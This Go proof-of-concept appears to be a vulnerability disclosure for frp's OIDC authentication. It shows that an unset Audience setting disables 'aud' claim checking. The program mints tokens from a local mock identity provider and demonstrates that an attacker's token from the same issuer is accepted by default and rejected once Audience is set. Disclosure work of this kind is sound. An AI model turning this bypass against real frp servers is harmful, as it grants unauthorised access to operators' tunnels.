// FrpMimic — missing OIDC audience (client ID) validation in frp
//
// frp (fatedier/frp) supports OIDC authentication for the server. Its token
// verifier is built in pkg/auth/oidc.go::NewTokenVerifier:
//
//	verifierConf := oidc.Config{
//	    ClientID:          cfg.Audience,          // "" unless the admin sets it
//	    SkipClientIDCheck: cfg.Audience == "",    // true by default
//	    SkipExpiryCheck:   cfg.SkipExpiryCheck,
//	    SkipIssuerCheck:   cfg.SkipIssuerCheck,
//	}
//
// `Audience` is optional (default ""), and when it is empty the verifier sets
// SkipClientIDCheck=true, i.e. it stops validating the `aud` claim entirely.
// OpenID Connect's `aud` claim is what binds a token to a specific relying
// party (client). Without it, ANY valid ID token issued by the configured
// issuer — including one minted for an attacker's own OAuth client — is
// accepted. frp also keeps no subject allowlist, so the attacker's identity is
// fully trusted.
//
// This program reproduces the exact verification logic using the SAME library
// frp vendors (github.com/coreos/go-oidc/v3 @ v3.21.0), against a local mock
// IdP. It mints two tokens that differ only in `aud`:
//   - "legit-frp-client"   (the relying party the admin *thinks* is authorised)
//   - "attacker-other-app" (an attacker-controlled client at the same issuer)
//
// With Audience unset (frp's default) BOTH verify => auth bypass (CWE-345).
// With Audience set to the legit client ID, the attacker token is rejected.
package main

import (
	"context"
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/big"
	"net/http"
	"net/http/httptest"
	"os"
	"time"

	"github.com/coreos/go-oidc/v3/oidc"
)

// ---------------------------------------------------------------------------
// Minimal JWT / JWKS helpers (stdlib only). We control the IdP key, so we can
// sign tokens without any external JWT library.
// ---------------------------------------------------------------------------

func b64url(b []byte) string { return base64.RawURLEncoding.EncodeToString(b) }

// mintIDToken builds a signed RS256 ID token for the given issuer/aud/subject.
func mintIDToken(priv *rsa.PrivateKey, kid, issuer, aud, subject string) (string, error) {
	header := map[string]any{"alg": "RS256", "kid": kid, "typ": "JWT"}
	claims := map[string]any{
		"iss": issuer,
		"sub": subject,
		"aud": aud,
		"iat": time.Now().Unix(),
		"exp": time.Now().Add(time.Hour).Unix(),
	}
	hb, _ := json.Marshal(header)
	cb, _ := json.Marshal(claims)
	signingInput := b64url(hb) + "." + b64url(cb)
	h := sha256.Sum256([]byte(signingInput))
	sig, err := rsa.SignPKCS1v15(rand.Reader, priv, crypto.SHA256, h[:])
	if err != nil {
		return "", err
	}
	return signingInput + "." + b64url(sig), nil
}

// jwks renders the public key as a single-key JWKS document.
func jwks(pub *rsa.PublicKey, kid string) ([]byte, error) {
	e := big.NewInt(int64(pub.E)).Bytes()
	doc := map[string]any{
		"keys": []map[string]any{{
			"kty": "RSA", "use": "sig", "alg": "RS256", "kid": kid,
			"n": b64url(pub.N.Bytes()), "e": b64url(e),
		}},
	}
	return json.Marshal(doc)
}

// mockIdP returns an httptest server speaking the OIDC discovery + JWKS
// endpoints that coreos/go-oidc expects, and the RSA key used to sign tokens.
func mockIdP(priv *rsa.PrivateKey, kid string) *httptest.Server {
	mux := http.NewServeMux()
	mux.HandleFunc("/.well-known/openid-configuration", func(w http.ResponseWriter, r *http.Request) {
		iss := "http://" + r.Host
		doc := map[string]any{
			"issuer":                                iss,
			"jwks_uri":                              "http://" + r.Host + "/keys",
			"authorization_endpoint":                "http://" + r.Host + "/auth",
			"token_endpoint":                        "http://" + r.Host + "/token",
			"response_types_supported":              []string{"id_token"},
			"subject_types_supported":               []string{"public"},
			"id_token_signing_alg_values_supported": []string{"RS256"},
		}
		_ = json.NewEncoder(w).Encode(doc)
	})
	mux.HandleFunc("/keys", func(w http.ResponseWriter, r *http.Request) {
		b, _ := jwks(&priv.PublicKey, kid)
		_, _ = w.Write(b)
	})
	return httptest.NewServer(mux)
}

// ---------------------------------------------------------------------------
// frp's verifier, copied verbatim from pkg/auth/oidc.go::NewTokenVerifier.
// ---------------------------------------------------------------------------

func frpNewTokenVerifier(issuer, audience string, skipExpiry, skipIssuer bool) (*oidc.IDTokenVerifier, error) {
	ctx := context.Background()
	provider, err := oidc.NewProvider(ctx, issuer)
	if err != nil {
		return nil, err
	}
	verifierConf := oidc.Config{
		ClientID:          audience,
		SkipClientIDCheck: audience == "",
		SkipExpiryCheck:   skipExpiry,
		SkipIssuerCheck:   skipIssuer,
	}
	return provider.Verifier(&verifierConf), nil
}

// verify prints whether a token is accepted by the verifier.
func verify(verifier *oidc.IDTokenVerifier, raw string) (*oidc.IDToken, error) {
	return verifier.Verify(context.Background(), raw)
}

func main() {
	kid := "mock-key"
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		fmt.Fprintln(os.Stderr, "keygen:", err)
		os.Exit(1)
	}

	srv := mockIdP(priv, kid)
	defer srv.Close()
	issuer := srv.URL

	// Two tokens from the SAME issuer, differing only in the aud (client ID).
	legitToken, _ := mintIDToken(priv, kid, issuer, "legit-frp-client", "alice")
	attackToken, _ := mintIDToken(priv, kid, issuer, "attacker-other-app", "mallory")

	fmt.Println("== frp OIDC audience-validation test ==")
	fmt.Println("issuer:", issuer)
	fmt.Println()

	// Case 1: frp's DEFAULT config — audience unset.
	vulnVerifier, err := frpNewTokenVerifier(issuer, "", false, false)
	if err != nil {
		fmt.Fprintln(os.Stderr, "verifier (default):", err)
		os.Exit(1)
	}
	fmt.Println("[1] Audience UNCONFIGURED  (frp default: SkipClientIDCheck=true)")
	for _, tc := range []struct{ label, raw string }{
		{"legit client   (aud=legit-frp-client)", legitToken},
		{"attacker client (aud=attacker-other-app)", attackToken},
	} {
		if _, err := verify(vulnVerifier, tc.raw); err == nil {
			fmt.Printf("    ACCEPT   %s\n", tc.label)
		} else {
			fmt.Printf("    REJECT   %s  (%v)\n", tc.label, err)
		}
	}
	fmt.Println()

	// Case 2: audience configured to the legit client ID (the secure config).
	fixVerifier, err := frpNewTokenVerifier(issuer, "legit-frp-client", false, false)
	if err != nil {
		fmt.Fprintln(os.Stderr, "verifier (audience set):", err)
		os.Exit(1)
	}
	fmt.Println("[2] Audience = \"legit-frp-client\"  (SkipClientIDCheck=false)")
	for _, tc := range []struct{ label, raw string }{
		{"legit client   (aud=legit-frp-client)", legitToken},
		{"attacker client (aud=attacker-other-app)", attackToken},
	} {
		if _, err := verify(fixVerifier, tc.raw); err == nil {
			fmt.Printf("    ACCEPT   %s\n", tc.label)
		} else {
			fmt.Printf("    REJECT   %s  (audience mismatch)\n", tc.label)
		}
	}

	fmt.Println()
	fmt.Println("Verdict: with audience unset (frp default), an attacker's ID token")
	fmt.Println("from the same issuer is accepted => authentication bypass (CWE-345).")
}
